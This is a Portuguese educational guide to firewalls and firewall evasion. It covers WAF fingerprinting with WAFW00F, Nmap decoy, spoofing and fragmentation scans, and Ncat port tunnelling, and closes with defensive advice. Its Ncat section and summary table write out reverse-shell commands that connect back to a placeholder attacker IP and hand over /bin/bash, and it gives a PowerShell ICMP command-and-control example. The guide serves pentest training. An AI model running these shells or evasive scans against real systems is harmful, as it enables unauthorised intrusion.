<!-- ===================================== -->
<!--      FIREWALL EVASION TECHNIQUES     -->
<!-- ===================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/Topic-Firewall%20Evasion-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Environment-Network%20Security-blue?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Focus-Network%20Defense%20Bypass-black?style=flat-square">
  <img src="https://img.shields.io/badge/Techniques-Packet%20Manipulation-purple?style=flat-square">
  <img src="https://img.shields.io/badge/Tools-Nmap%20%7C%20Netcat%20%7C%20WAFW00F-yellow?style=flat-square">
  <img src="https://img.shields.io/badge/Domain-Offensive%20Security-informational?style=flat-square">
</p>

---

# 🔥 Firewalls e Técnicas de Evasão
## Análise de Defesas de Rede e Métodos de Bypass

> Este documento apresenta uma análise técnica sobre **firewalls modernos** e as principais **técnicas utilizadas para evadir mecanismos de filtragem de rede** durante atividades de **Pentest, Red Team e pesquisa em segurança ofensiva**.
>
> Firewalls são um dos principais controles de segurança em infraestruturas corporativas, atuando como **barreira entre redes confiáveis e não confiáveis**. No entanto, configurações incorretas, limitações técnicas e estratégias avançadas de ataque podem permitir que um adversário **contorne essas proteções**.
>
> Ao longo deste material são exploradas técnicas utilizadas para:
>
> - 🔍 **Identificação de firewalls e WAFs**
> - 🧬 **Manipulação de pacotes de rede**
> - 🎭 **Mascaramento de origem do tráfego**
> - 🔐 **Encapsulamento e tunelamento de comunicação**
> - 📡 **Uso de protocolos alternativos para evasão**
>
> O objetivo é demonstrar **como atacantes exploram lacunas na inspeção de tráfego**, permitindo compreender melhor **como essas técnicas funcionam e como podem ser mitigadas**.

---

## 🎯 Objetivo Técnico

Este documento demonstra, de forma prática e conceitual, como realizar:

- 🔎 **Fingerprinting de firewalls e WAFs**
- 📡 **Análise de regras e comportamento de filtragem**
- 🧩 **Evasão de detecção através de manipulação de pacotes**
- 🕵️ **Ocultação de origem em scans de rede**
- 🔐 **Tunelamento de serviços através de portas permitidas**
- ⚙️ **Uso de ferramentas ofensivas para bypass de controles de rede**

As técnicas exploradas são comuns em **testes de penetração em redes corporativas**, **laboratórios de segurança** e **ambientes de pesquisa em defesa cibernética**.

---

## 🧰 Ferramentas Utilizadas

Durante os exemplos e demonstrações deste material serão utilizadas ferramentas amplamente adotadas na área de segurança ofensiva:

- **Nmap** — Reconhecimento de rede e evasão de firewall  
- **WAFW00F** — Identificação de Web Application Firewalls  
- **Netcat / Ncat** — Tunelamento e comunicação em rede  
- **Wireshark** — Análise de tráfego e inspeção de pacotes

---

⚠️ Este material possui fins exclusivamente **educacionais e de pesquisa em segurança**.  
As técnicas apresentadas devem ser utilizadas **apenas em ambientes autorizados**, como **laboratórios, CTFs ou testes de segurança com permissão explícita**.

---

# Firewalls e Técnicas de Evasão

## Introdução aos Firewalls

### 1.1 O que é um Firewall?

Um firewall é um sistema de segurança que monitora e controla o tráfego de rede com base em regras predefinidas. Ele atua como uma barreira entre uma rede interna confiável e redes externas não confiáveis (como a Internet), permitindo ou bloqueando pacotes de dados com base em seu endereço de origem, porta de destino, protocolo e outros parâmetros.

### 1.2. Tipos de Firewall

Os firewalls evoluíram significativamente ao longo dos anos. Compreender seus tipos é fundamental para escolher a técnica de evasão correta.

| **Tipo de Firewall**                  | **Descrição**                                                                                                                                                                                             | **Camada de Operação**            |
| ------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------- |
| Filtragem de Pacotes                  | O tipo mais básico. Inspeciona cabeçalhos de pacotes individualmente (IP origem/destino, porta, protocolo) sem manter contexto da conexão.                                                                | Camada 3 (Rede) e 4 (Transporte)  |
| Stateful Inspection                   | Mantém uma tabela de estado das conexões ativas. Decide com base no contexto da sessão, não apenas em pacotes isolados.                                                                                   | Camadas 3 e 4                     |
| Proxy Firewall (Gateway de Aplicação) | Atua como intermediário entre cliente e servidor. Inspeciona o tráfego na camada de aplicação, podendo autenticar usuários e filtrar comandos específicos.                                                | Camada 7 (Aplicação)              |
| Next-Generation Firewall (NGFW)       | Combina funções de firewalls tradicionais com inspeção profunda de pacotes (DPI), prevenção de intrusões (IPS), reconhecimento de aplicações e inteligência contra ameaças.                               | Camadas 3 a 7                     |
| Web Application Firewall (WAF)        | Especializado em proteger aplicações web. Fica entre o cliente e o servidor web, inspecionando tráfego HTTP/HTTPS para bloquear ataques como SQL Injection e XSS. Pode ser baseado em rede, host ou cloud | Camada 7 (Aplicação - HTTP/HTTPS) |

### 1.3. Como os Firewalls Funcionam?

O funcionamento básico envolve a aplicação de um conjunto de regras. Quando um pacote chega, o firewall o analisa e toma uma ação:

- **Permitir (Allow):** O tráfego é liberado.
- **Bloquear (Deny/Reject):** O tráfego é descartado (geralmente de forma silenciosa) ou rejeitado com uma mensagem de erro.
- **Registrar (Log):** O evento é registrado para análise posterior.

Os WAFs, em particular, analisam cabeçalhos HTTP, cookies, strings de consulta e o corpo da mensagem em busca de padrões maliciosos, usando detecção baseada em assinaturas ou análise comportamental.

### 1.4. Casos de Uso Comuns

- **Proteção contra ataques web:** Bloquear SQLi, XSS, CSRF (especialmente WAFs).
- **Segmentação de rede:** Isolar redes internas (ex: DMZ, rede corporativa, rede de desenvolvimento).
- **Controle de acesso:** Restringir acesso a serviços internos (ex: apenas IPs da empresa podem acessar o SSH).
- **Mitigação de DDoS:** Absorver ou limitar tráfego malicioso em ataques de negação de serviço.
- **Conformidade:** Atender a requisitos regulatórios como PCI DSS, HIPAA e LGPD.

---
## 2. Princípios da Evasão de Firewall

### 2.1. Por que Firewalls São Evadidos?

A evasão é possível devido a:

- **Configurações Incorretas (Misconfigurations):** A causa mais comum. Regras muito permissivas ("permitir qualquer coisa na porta 80") ou mal documentadas criam brechas.
- **Vulnerabilidades de Software:** O próprio software do firewall pode conter falhas exploráveis.
- **Atualizações Atrasadas:** Firewalls desatualizados não possuem assinaturas para ameaças recentes.
- **Estratégias Ofensivas:** Atacantes usam técnicas para fazer o tráfego malicioso parecer legítimo ou para fragmentá-lo de forma que o firewall não consiga inspecioná-lo completamente.

### 2.2. Estratégias Comuns de Evasão

Atacantes focam em explorar lacunas deixadas por administradores. As estratégias podem ser agrupadas em:

1. **Controlando a Origem (Source Spoofing):** Mascarar a verdadeira origem do ataque para não ser bloqueado ou para se esconder entre outros IPs.
2. **Manipulação de Pacotes:** Fragmentar pacotes ou modificar campos de cabeçalho para evitar a inspeção ou correspondência de assinaturas.
3. **Uso de Protocolos e Portas Alternativas:** Utilizar portas comumente abertas (80, 443, 53) ou protocolos como ICMP e DNS para tunelar o tráfego malicioso.
4. **Exploração da Camada de Aplicação:** Atacar a aplicação diretamente, muitas vezes usando tráfego HTTP/HTTPS legítimo que passa pelo firewall sem inspeção adequada.

---
## 3. Fase 1: Identificação do Firewall (Fingerprinting)

Antes de tentar evadir, é preciso conhecer o inimigo. A identificação do tipo de firewall, especialmente de um WAF, é o primeiro passo.

### 3.1. Introdução ao WAFW00F

O **WAFW00F** é uma ferramenta de fingerprinting especializada em Web Application Firewalls. Seu funcionamento é baseado em três etapas:

1. Envia uma requisição HTTP normal e analisa a resposta. Isso identifica muitos WAFs.
2. Se não for bem-sucedido, envia uma série de requisições HTTP potencialmente maliciosas para tentar provocar uma resposta característica do WAF.
3. Por fim, analisa todas as respostas anteriores com um algoritmo heurístico para "adivinhar" se há um WAF presente.

### 3.2. Instalação e Uso Básico

No Kali Linux, a instalação é simples:

```bash
sudo apt update
sudo apt install wafw00f
```

A sintaxe básica é:

```bash
wafw00f [opções] <url_alvo>
```

### 3.3. Exemplos Práticos e Análise de Saída

**Exemplo 1: Scan Simples**

```bash
wafw00f https://exemplo.com.br
```

**Saída Esperada:**

```text
[*] Checking https://exemplo.com.br
[+] The site https://exemplo.com.br is behind Wordfence (Defiant) WAF.
[!] Generic Detection results:
[*] Number of requests: 8
```

Neste caso, a ferramenta identificou que o site está protegido pelo WAF Wordfence.

**Exemplo 2: Scan Verboso com Proxy**  
Para testar um alvo que exige um proxy e obter mais detalhes:

```bash
wafw00f -v -p http://127.0.0.1:8080 https://alvo-restrito.com
```

**Análise da Saída:**

```text
[*] Checking https://alvo-restrito.com
[+] Using proxy: http://127.0.0.1:8080
[~] Request 1: Normal GET /
[~] Response Headers: Server: nginx
[~] Request 2: Malicious GET /?=<script>alert(1)</script>
[~] Response Code: 403 Forbidden
[~] Response Body: Access Denied - AWS WAF
[+] The site https://alvo-restrito.com is behind Amazon AWS WAF (Amazon)
```

A opção `-v` mostra cada requisição e resposta, permitindo entender como a ferramenta chegou à conclusão. A resposta 403 com o corpo "AWS WAF" é uma assinatura forte.

**Exemplo 3: Listar Todos os WAFs Detectáveis**

```bash
wafw00f -l
```

Isso mostra uma longa lista de WAFs que a ferramenta consegue identificar, como Cloudflare, AWS WAF, F5 BIG-IP, ModSecurity, entre outros.

---
## 4. Fase 2: Técnicas de Evasão com Nmap

O Nmap é a principal ferramenta para descoberta de rede e possui inúmeras opções para evasão de firewalls.
### 4.1. Controlando a Origem: MAC/IP/Porta

Estas técnicas visam esconder ou disfarçar a origem do scan.

| **Técnica**       | Argumento Nmap                | Descrição                                                                                                                                                                       |
| ----------------- | ----------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Decoy (Iscas)** | `-D RND,RND,ME`               | Mistura seu IP real com IPs aleatórios ou especificados, dificultando a identificação do verdadeiro atacante.                                                                   |
| **Proxy**         | `--proxies proxy_url`         | Roteia o scan através de um proxy HTTP ou SOCKS4, ocultando seu IP real. Permite encadear múltiplos proxies.                                                                    |
| **Spoofed MAC**   | `--spoof-mac MAC`             | Altera o endereço MAC de origem. Só funciona na mesma rede local. Útil para parecer outro dispositivo (ex: uma impressora).                                                     |
| **Spoofed IP**    | `-S IP_ALVO`                  | Altera o IP de origem. Só funciona se você puder ver as respostas (na mesma rede) ou se não precisar delas (scan às cegas). Pode explorar relações de confiança baseadas em IP. |
| **Porta Fixa**    | `-g 53` ou `--source-port 53` | Força o uso de uma porta de origem específica. Útil se o firewall permitir tráfego de portas confiáveis como 53 (DNS), 80 (HTTP) ou 443 (HTTPS) sem inspeção profunda.          |

**Exemplo de Comando (Decoy + Porta Fixa):**

```bash
nmap -sS -Pn -p 80,443,22 -D 10.10.10.1,10.10.10.2,ME -g 53 10.10.10.100
```

**Análise:** Este scan fará uma varredura SYN nas portas 80, 443 e 22 do alvo 10.10.10.100. Usará as portas 53 como porta de origem e tentará se misturar com dois IPs "isca". O alvo verá conexões vindas de três IPs diferentes, dificultando o bloqueio.

Na captura do scan através do Wireshark é possível notar os diferentes IPs usados como decoy.

Comando:

```bash
nmap -sS -Pn -D 10.10.10.1,10.10.10.2,ME -F <alvo>
```

Captura do Wireshark:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/0123f32d7cc90fca50a3d565824955b1.png)

A captura de tela do Wireshark a seguir mostra uma varredura Nmap com o número de porta TCP de origem fixo em 8080. Usamos o seguinte comando Nmap: `nmap -sS -Pn -g 8080 -F MACHINE_IP`. Você pode ver na captura de tela como todas as conexões TCP são enviadas a partir do mesmo número de porta TCP.

Comando:

```bash
nmap -sS -Pn -g 8080 -F <alvo>
```

Captura do Wireshark:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/a0307f9e74e7f110b546dc7b423a288e.png)

### 4.2. Fragmentação, MTU e Tamanho de Pacotes

Sistemas de detecção de intrusão (IDS) e alguns firewalls podem não remontar pacotes fragmentados corretamente, ou podem ser configurados para ignorar fragmentos, criando uma oportunidade de evasão.

| **Técnica**                 | **Argumento Nmap**    | **Descrição**                                                                                                                                                                    |
| --------------------------- | --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Fragmentação (8 bytes)**  | `-f`                  | Divide o pacote IP em fragmentos de 8 bytes (após o cabeçalho IP). Dificulta a detecção por sistemas que não remontam fragmentos.                                                |
| **Fragmentação (16 bytes)** | `-ff`                 | Divide o pacote em fragmentos de 16 bytes.                                                                                                                                       |
| **MTU Personalizado**       | `--mtu <valor>`       | Define o tamanho máximo da unidade de transmissão (MTU). O valor deve ser múltiplo de 8 (ex: 16, 24, 32). Oferece controle mais fino sobre a fragmentação.                       |
| **Tamanho de Dados**        | `--data-length <num>` | Adiciona uma quantidade específica de dados aleatórios ao final dos pacotes. Pode alterar o tamanho total do pacote para evitar detecção baseada em assinaturas de tamanho fixo. |

**Exemplo de Comando (Fragmentação + Tamanho de Dados):**

```bash
nmap -sS -Pn -f --data-length 200 -p 80 10.10.10.100
```

**Análise:** Este comando fará um scan na porta 80. Cada pacote TCP será fragmentado em pedaços de 8 bytes e terá 200 bytes de dados aleatórios adicionados. Isso torna o pacote muito diferente de um pacote de scan padrão, potencialmente escapando de detecções simples.

Como podemos ver na captura do Wireshark na figura abaixo, cada pacote IP é fragmentado em três pacotes, cada um com 8 bytes de dados.

Comando:

```bash
nmap -sS -Pn -f -F <alvo>
```

Captura do Wireshark:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/4b9961c8f49af3eded45b0b43c03548b.png)

Outra opção útil é o parâmetro `-ff`, que limita os dados IP a 16 bytes. (Uma maneira fácil de lembrar disso é que um "`f`" corresponde a 8 bytes, mas dois "`fs`" correspondem a 16 bytes.) Ao executar o comando `nmap -sS -Pn -ff -F MACHINE_IP`, esperamos que os 24 bytes do cabeçalho TCP sejam divididos entre dois pacotes IP, 16 + 8, porque o parâmetro `-ff` impôs um limite máximo de 16 bytes. Os primeiros pacotes são mostrados na captura do Wireshark abaixo.

Comando:

```bash
nmap -sS -Pn -ff -F <alvo>
```

Captura do Wireshark:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/fc0fd2f0fed576aed08e9750acff314b.png)

Executando o Nmap com `--mtu 8` será idêntico a `-f`, pois os dados IP serão limitados a 8 bytes. Os primeiros pacotes gerados por esta varredura do Nmap, `nmap -sS -Pn --mtu 8 -F MACHINE_IP`, são mostrados na seguinte captura do Wireshark:

Comando:

```bash
nmap -sS -Pn --mtu 8 -F <alvo>
```

Captura do Wireshark:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/7ec48d889b3ba89910d69526ddbe4fd2.png)

Se você executar o seguinte comando Nmap: `nmap -sS -Pn --data-length 64 -F MACHINE_IP`, cada segmento TCP será preenchido com dados aleatórios até atingir 64 bytes. Na captura de tela abaixo, podemos ver que cada segmento TCP tem um comprimento de 64 bytes.

Comando:

```bash
nmap -sS -Pn --data-length 64 -F <alvo>
```

Captura do Wireshark:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c71dd8a63e95fac1ad5a2aa68220c780.png)

### 4.3. Modificação de Campos de Cabeçalho

Permite um controle ainda mais granular sobre como os pacotes são montados.

| **Técnica**           | **Argumento Nmap**      | **Descrição**                                                                                                                                                                                                                                                 |
| --------------------- | ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **TTL Personalizado** | `--ttl <valor>`         | Altera o valor do campo Time-to-Live no cabeçalho IP. Pode ser usado para fazer o scan parecer vir de um roteador próximo, por exemplo.                                                                                                                       |
| **Opções de IP**      | `--ip-options <opções>` | Adiciona opções ao cabeçalho IP, como roteamento de origem (L e S) ou registro de rota (R). Pode forçar o pacote a seguir uma rota específica para evitar um sistema de segurança.                                                                            |
| **Checksum Inválido** | `--badsum`              | Envia pacotes com checksums TCP/UDP intencionalmente errados. A maioria dos sistemas descarta esses pacotes. Se você receber uma resposta, isso indica que o firewall ou sistema alvo não está verificando a integridade dos pacotes, uma falha de segurança. |

**Exemplo de Comando (Badsum):**

```bash
nmap -sS -Pn --badsum -p 80 10.10.10.100
```

**Análise:** Se o alvo responder a este scan (com um SYN-ACK, por exemplo), é um forte indicador de que o sistema não está validando o checksum, revelando uma potencial vulnerabilidade ou configuração insegura.

Na captura de tela a seguir, podemos ver os pacotes capturados pelo Wireshark após usarmos um TTL personalizado enquanto executávamos nossa varredura, `nmap -sS -Pn --ttl 81 -F MACHINE_IP`. Assim como nos exemplos anteriores, os pacotes abaixo foram capturados no mesmo sistema que executava o Nmap.

Comando:

```bash
nmap -sS -Pn --ttl 81 -F <alvo>
```

Captura do Wireshark:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f98efaf6faf449bf6cc2787baa581e31.png)

Usando o comando `nmap -sS -Pn --badsum -F MACHINE_IP`, escaneamos nosso alvo usando checksums TCP intencionalmente incorretos. O alvo descartou todos os nossos pacotes e não respondeu a nenhum deles. A captura de tela abaixo mostra os pacotes capturados pelo Wireshark no sistema que executa o Nmap. O Wireshark pode ser configurado opcionalmente para verificar os checksums, e podemos observar como ele destaca os erros.

Comando:

```bash
nmap -sS -Pn --badsum -F <alvo>
```

Captura do Wireshark:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c7817144af9ef754d778fc4efb0f9a36.png)

### 4.4. Comparação: Scan Normal vs. Scan Evasivo

Vamos comparar um scan básico com um que combina múltiplas técnicas.

**Cenário:**

- **Alvo:** servidor web (10.10.10.100)
- **Objetivo:** Descobrir portas abertas sem ser detectado.

**Scan Normal:**

```bash
nmap -p 1-1000 10.10.10.100
```

- **Características:** Usa o IP real da máquina atacante, porta de origem aleatória, pacotes de tamanho padrão, sem fragmentação. É facilmente detectado e bloqueado.

Captura do scan através do Wireshark:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/169fd944d79366e156fcb6c30ff8018e.png)

**Scan Evasivo:**

```bash
nmap -sS -Pn -f --mtu 16 --data-length 100 -D RND,RND,RND,ME -g 80 --ttl 128 -p 1-1000 10.10.10.100
```

- **Características:**
    - `-sS -Pn`: Scan stealth, sem descoberta de host (assume que o host está ativo).
    - `-f --mtu 16`: Força fragmentação em pacotes de 16 bytes.
    - `--data-length 100`: Adiciona 100 bytes de dados aleatórios.
    - `-D RND,RND,RND,ME`: Usa três IPs aleatórios como isca, misturando-se a eles.
    - `-g 80`: Usa a porta 80 (HTTP) como porta de origem.        
    - `--ttl 128`: Define o TTL para 128 (um valor comum em sistemas Windows).

- **Impacto na Evasão:** Este scan é muito mais difícil de ser detectado e bloqueado. Ele se esconde entre outros IPs, seus pacotes são fragmentados e com tamanho alterado, e se originam de uma porta confiável (80). O alvo vê múltiplas fontes e pacotes que não se parecem com um scan comum.

---
## 5. Fase 3: Evasão com Netcat e Ncat

O Netcat é o "canivete suíço" das redes. O Ncat é sua versão moderna e mais poderosa, incluída no Nmap.

### 5.1. Netcat vs. Ncat

| **Característica**         | **Netcat (`nc`)**             | **Ncat (`ncat`)**                     |
| -------------------------- | ----------------------------- | ------------------------------------- |
| **Manutenção**             | Descontinuado, versões variam | Ativamente mantido pelo Nmap Project  |
| **Criptografia (SSL/TLS)** | Não                           | Sim (`--ssl`)                         |
| **Proxy (SOCKS/HTTP)**     | Não                           | Sim (`--proxy`)                       |
| **Chaining de Conexões**   | Limitado                      | Sim, com `--proxy` e `--proxy-type`   |
| **Modo "Broker"**          | Não                           | Sim, para conectar múltiplos clientes |

### 5.2. Port Hopping

É uma técnica onde o cliente ou servidor muda de porta durante a comunicação para evitar ser bloqueado. Uma aplicação pode tentar várias portas até estabelecer uma conexão, ou "saltar" para uma nova porta após um tempo para dificultar o rastreamento.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/26fce8aa8569f391ad64a26a147de2d4.png)

Embora não seja uma funcionalidade direta do Netcat, um script simples pode simular o _client-side_ port hopping, tentando conectar a uma lista de portas até obter sucesso.

### 5.3. Port Tunneling (ou Port Forwarding)

É o ato de encapsular tráfego de um serviço em uma porta diferente. É extremamente útil para contornar firewalls que bloqueiam portas específicas.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ef6b903dbb6c4eb20051f9ddd5b9fa8f.png)

**Cenário:** Um servidor SMTP (porta 25) está atrás de um firewall que bloqueia a porta 25. No entanto, a porta 443 (HTTPS) está aberta. Se tivermos acesso a uma máquina dentro da rede, podemos usá-la para criar um túnel.

**Comando na máquina interna (jump host):**

```bash
ncat -lvnp 443 -c "ncat 192.168.1.10 25"
```

**Explicação:**

- `-l`: Modo de escuta (listener).
- `-v`: Modo verboso.
- `-n`: Não resolve nomes (usar IPs).
- `-p 443`: Escuta na porta 443.
- `-c "ncat 192.168.1.10 25"`: Para cada conexão recebida na porta 443, executa o comando `ncat` para encaminhar os dados para o servidor SMTP real (IP 192.168.1.10, porta 25).

Agora, um atacante externo pode simplesmente conectar-se à porta 443 do jump host, e seu tráfego será encaminhado para o servidor SMTP, como se estivesse acessando diretamente a porta 25, mas passando pelo firewall.

### 5.4. Uso de Portas Não Padronizadas

Esta é a forma mais simples de evasão. Consiste em configurar um serviço malicioso (como um shell reverso) para ouvir ou conectar-se em uma porta que é tipicamente permitida pelo firewall de saída ou entrada.

**Exemplo (Anexo na Porta 80):**  
Na máquina do atacante (modo listener):

```bash
ncat -lvnp 80 --ssl
```

Na máquina alvo (conectando de volta):

```bash
ncat --ssl <IP_ATACANTE> 80 -e /bin/bash
```

**Análise:** O tráfego de comando e controle (C2) agora está sendo transmitido pela porta 80 (HTTP) e criptografado com SSL. Para um firewall que não inspeciona o tráfego HTTP/HTTPS, isso parecerá apenas uma conexão web comum.

---
## 6. Métodos Avançados e Complementares

### 6.1. Evasão via Canais ICMP

Alguns firewalls negligenciam a inspeção do tráfego ICMP (ping). Ferramentas como o `nishang` (PowerShell) podem criar um canal de comando e controle (C2) sobre ICMP.

**Exemplo Conceitual (PowerShell):**

```powershell
# No alvo (Windows)
Invoke-PowerShellIcmp -IPAddress <IP_ATACANTE>
```

**No atacante (Linux), um listener ICMP personalizado receberia os comandos e respostas encapsulados em pacotes de ping.**

### 6.2. Evasão via DNS Tunneling

Muitas redes permitem tráfego DNS irrestrito. O DNS Tunneling encapsula dados de outros protocolos (como SSH ou HTTP) em consultas e respostas DNS. Ferramentas como `dnscat2` são especializadas nisso.

### 6.3. Evasão via Protocolos Criptografados (HTTPS, SSH)

Usar criptografia (SSL/TLS) com ferramentas como `ncat --ssl` ou `socat` pode mascarar a natureza maliciosa do tráfego, pois o payload está cifrado. Firewalls sem recursos de inspeção SSL/TLS (decriptação e reinspeção) não conseguem analisar o conteúdo.

---
## 7. Tabela Resumo de Comandos

|Técnica|Ferramenta|Exemplo de Comando|Objetivo da Evasão|
|---|---|---|---|
|**Fingerprinting WAF**|`wafw00f`|`wafw00f -a https://exemplo.com`|Identificar o tipo de WAF antes do ataque.|
|**Decoy Scan**|`nmap`|`nmap -D RND,RND,ME 10.10.10.100`|Esconder IP real entre iscas.|
|**Proxy Scan**|`nmap`|`nmap --proxies http://proxy:8080 10.10.10.100`|Roteie o scan por um proxy.|
|**Spoof MAC**|`nmap`|`nmap --spoof-mac 00:11:22:33:44:55 10.10.10.100`|Parecer outro dispositivo na LAN.|
|**Porta Fixa**|`nmap`|`nmap -g 53 10.10.10.100`|Usar porta de origem confiável (DNS).|
|**Fragmentação**|`nmap`|`nmap -f 10.10.10.100`|Evitar detecção por sistemas que não remontam fragmentos.|
|**Tamanho de Dados**|`nmap`|`nmap --data-length 150 10.10.10.100`|Alterar assinatura de tamanho do pacote.|
|**Bad Checksum**|`nmap`|`nmap --badsum 10.10.10.100`|Testar se o alvo valida integridade dos pacotes.|
|**Port Tunneling**|`ncat`|`ncat -lvnp 443 -c "ncat mail.intel 25"`|Encaminhar tráfego de uma porta permitida para uma bloqueada.|
|**Shell Criptografado**|`ncat`|`ncat --ssl -lvnp 443 -e /bin/bash`|Criar um shell reverso criptografado em porta comum.|

---

## 8. Conclusão e Boas Práticas

A evasão de firewalls é uma arte que combina conhecimento técnico profundo com criatividade. Compreender como os firewalls funcionam é o primeiro passo para superá-los. As técnicas apresentadas, desde o fingerprinting com `wafw00f` até a manipulação de pacotes com `nmap` e o tunelamento com `ncat`, formam um arsenal essencial para qualquer pentester.

### 8.1. Para o Profissional de Ataque (Red Team)

- **Conheça seu alvo:** Use fingerprinting para identificar o firewall antes de tentar evadí-lo.
- **Combine técnicas:** Um único método pode falhar, mas uma combinação (ex: fragmentação + decoy + porta fixa) é muito mais eficaz.
- **Seja paciente:** Evasão bem-sucedida muitas vezes requer tentativa e erro, ajustando parâmetros.
- **Documente:** Anote quais técnicas funcionaram em qual ambiente para referência futura.

### 8.2. Para o Profissional de Defesa (Blue Team)

- **Audite regras regularmente:** Revise as regras do firewall para eliminar as excessivamente permissivas.
- **Mantenha-se atualizado:** Atualize seus firewalls com os últimos patches de segurança e feeds de inteligência de ameaças.
- **Use inspeção profunda de pacotes:** Habilite recursos como DPI e inspeção SSL em NGFWs para analisar o tráfego criptografado.
- **Implemente defesa em camadas:** Um firewall é apenas uma camada. Combine-o com IDS/IPS, EDR e análise comportamental.
- **Monitore e eduque:** Monitore logs para identificar padrões de scan e eduque os administradores sobre a importância de uma configuração segura.

